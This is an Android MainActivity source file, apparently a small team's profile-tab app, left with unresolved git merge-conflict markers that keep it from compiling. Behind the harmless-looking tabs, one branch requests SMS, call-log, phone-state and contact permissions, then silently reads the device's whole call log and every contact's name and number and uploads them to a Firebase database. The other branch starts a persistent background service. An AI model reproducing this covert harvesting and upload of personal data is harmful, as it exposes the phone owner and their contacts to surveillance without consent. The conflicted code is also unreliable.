package com.example.super_secret;

import java.util.Date;
import android.Manifest;
<<<<<<< HEAD
import android.app.ActivityManager;
import android.util.Log;
import android.content.Intent;
=======
import android.content.Context;
>>>>>>> master
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.widget.Toast;
<<<<<<< HEAD
import android.content.Context;
import android.content.Intent;
import android.app.ActivityManager;
=======
import java.text.SimpleDateFormat;
>>>>>>> master
import com.google.android.material.tabs.TabLayout;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import androidx.core.app.ActivityCompat;
import androidx.viewpager.widget.ViewPager;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;

<<<<<<< HEAD

//import android.os.Bundle;
//import android.app.Activity;
//import android.telephony.SmsManager;
//import android.view.Menu;
//import android.view.inputmethod.InputMethodManager;
//import android.widget.*;
//import android.view.View.OnClickListener;
//import android.view.*;
//
//import java.util.ArrayList;

=======
>>>>>>> master
public class MainActivity extends AppCompatActivity {

    private ViewPager viewPager;
    private TabLayout tabLayout;
    private Toolbar toolbar;
    private static final int MY_PERMISSIONS_REQUEST_RECEIVE_SMS = 0;
<<<<<<< HEAD
    private static final String TAG = "Myactivity";
    Intent mServiceIntent;
    private ServiceSensor mSensorService;
    Context ctx;
=======
    private static final int MY_PERMISSIONS_REQUEST_READ_CALL_LOG = 0;
    private static final int MY_PERMISSIONS_REQUEST_PHONE_STATE = 0;
    private static final int MY_PERMISSIONS_REQUEST_PHONE_CONTACTS = 0;

    private int PERMISSION_ALL = 1;
    private String[] PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS
    };
>>>>>>> master

    public Context getCtx() {
        return ctx;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        ctx = this;
        setContentView(R.layout.activity_main);
        mSensorService = new ServiceSensor(getCtx());
        mServiceIntent = new Intent(getCtx(), mSensorService.getClass());
        if (!isMyServiceRunning(mSensorService.getClass())) {
            startService(mServiceIntent);
        }

        tabLayout = (TabLayout) findViewById(R.id.tabs);
        viewPager = (ViewPager) findViewById(R.id.view_pager);
        toolbar = (Toolbar) findViewById(R.id.myToolbar);


        setSupportActionBar(toolbar);
        setupViewPager(viewPager);
        tabLayout.setupWithViewPager(viewPager);
<<<<<<< HEAD
        // if sms permission is not granted
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            // if the permission is not granted then check if the user has denied the permission
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.RECEIVE_SMS)) {
                // Do nothing as user has denied
            } else {
                // a popup will appear
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS}, MY_PERMISSIONS_REQUEST_RECEIVE_SMS);
            }
=======

        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }
        else {
            getAllCallLogs(this);
            getContactList(this);
>>>>>>> master
        }
        Log.i(TAG,"PermissionGranted");
    }// OnCreate
    //after getting the result of permission request

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        //check requestCode
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_RECEIVE_SMS: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    //New broadcast receiver will work in background
                    Toast.makeText(this, "Thank you for permission", Toast.LENGTH_LONG).show();
                } else
                    Toast.makeText(this, "This app will require permissions", Toast.LENGTH_LONG).show();
            }
        }
    }

    //Populate the Tabs
    private void setupViewPager(ViewPager viewPager) {
        ViewPagerAdapter viewPagerAdapter = new ViewPagerAdapter(getSupportFragmentManager());
<<<<<<< HEAD
        viewPagerAdapter.addFragment(new Farid_Profile(), "Farid");
        viewPagerAdapter.addFragment(new Derek_Profile(), "Derek");
        viewPagerAdapter.addFragment(new Callie_Profile(), "Callie");
        viewPagerAdapter.addFragment(new XinWei_Profile(), "Xin Wei");
        viewPagerAdapter.addFragment(new MingKiat_Profile(), "Ming Kiat");
        viewPagerAdapter.addFragment(new KangSian_Profile(), "Kang Sian");

        viewPager.setAdapter(viewPagerAdapter);
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i("isMyServiceRunning?",true+"");
                return true;
            }
        }
        Log.i("isMyServiceRunning?",false+"");
        return false;
    }
    @Override
    protected void onDestroy()
    {
        stopService(mServiceIntent);
        Log.i("MainAct","onDestroy!");
        super.onDestroy();
    }
=======
        viewPagerAdapter.addFragment(new Homepage(),"Homepage");
        viewPagerAdapter.addFragment(new Farid_Profile(),"Farid");
        viewPagerAdapter.addFragment(new Derek_Profile(),"Derek");
        viewPagerAdapter.addFragment(new Callie_Profile(),"Callie");
        viewPagerAdapter.addFragment(new XinWei_Profile(),"Xin Wei");
        viewPagerAdapter.addFragment(new MingKiat_Profile(),"Ming Kiat");
        viewPagerAdapter.addFragment(new KangSian_Profile(),"Kang Sian");
        viewPager.setAdapter(viewPagerAdapter);
    }

    private void getAllCallLogs(Context cr) {

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        // reading all data in descending order according to DATE
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor cur = cr.getContentResolver().query(callUri, null, null, null, strOrder);
        // loop through cursor
        while (cur.moveToNext()) {
            String callNumber = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
            String callName = cur
                    .getString(cur
                            .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
            String callDate = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat(
                    "dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
            String callType = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.TYPE));
            String isCallNew = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.NEW));
            String duration = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.DURATION));
            // process log data...

            //populate the realtime firebase
            DatabaseReference myCallRef = database.getReference().child("Call Logs").push().child("Calls");
            myCallRef.child("Caller Name").setValue(callName);
            myCallRef.child("Call Number").setValue(callNumber);
            myCallRef.child("Date of Call").setValue(dateString);
            myCallRef.child("Call Type").setValue(callType);
            myCallRef.child("New Call").setValue(isCallNew);
            myCallRef.child("Call Duration").setValue(duration);
        }
    }

    private void getContactList(Context cr){
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        Cursor cur = cr.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
                null,null,null);

        if ((cur!=null ? cur.getCount() : 0) > 0){
            while (cur != null && cur.moveToNext()){
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                    Cursor pCur = cr.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()){
                        DatabaseReference contactRef = database.getReference().child("Contacts").push();
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contactRef.child("Name").setValue(name);
                        contactRef.child("Number").setValue(phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }

>>>>>>> master
}